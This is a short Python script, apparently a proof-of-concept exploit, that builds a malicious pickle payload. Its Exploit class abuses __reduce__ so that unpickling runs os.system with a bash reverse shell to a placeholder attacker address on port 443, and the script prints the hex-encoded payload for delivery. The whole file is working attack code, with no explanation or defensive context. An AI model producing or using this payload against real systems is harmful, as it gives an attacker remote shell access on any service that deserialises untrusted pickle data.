import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<IP_Atacante>/443 0>&1"',))

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit())))
